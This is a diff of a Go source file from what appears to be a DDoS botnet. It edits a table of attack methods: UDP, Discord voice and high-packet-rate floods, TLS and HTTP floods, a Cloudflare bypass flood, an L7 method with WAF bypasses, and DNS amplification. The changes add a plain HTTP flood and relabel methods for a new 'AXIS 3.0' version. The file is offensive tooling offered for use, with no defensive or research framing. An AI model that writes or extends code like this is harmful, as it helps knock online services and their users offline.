@@ -58,13 +58,13 @@ var attackInfoLookup = map[string]AttackInfo{
 	"discord":  {30, []uint8{0, 1, 6, 7, 13}, "Discord voice chat flood"},
 	"pps":      {3, []uint8{6, 7, 13}, "High PPS UDP flood"},
 
-	/* APEX 2.0 L7 Methods */
+	/* AXIS 3.0 L7 Methods */
 	"tls":      {4, []uint8{7, 8, 9, 11, 12, 14}, "Standard TLS/HTTPS flood"},
-	"tlsplus":  {5, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Enhanced TLS flood with header randomization"},
+	"http":     {5, []uint8{7, 8, 9, 11, 12, 14, 16}, "Plain HTTP flood with rotating user agents"},
 	"cf":       {6, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Cloudflare bypass flood"},
 
 	/* AXIS-L7 (with proxy support merged from tlsplusbypass) */
-	"axis-l7":  {7, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Advanced L7 with HTTP CONNECT proxy support"},
+	"axis-l7":  {7, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Advanced L7 with WAF bypasses"},
 
 	/* Amplification Methods */
 	"dns-amp":  {8, []uint8{6, 13}, "DNS Amplification (50x-100x)"},
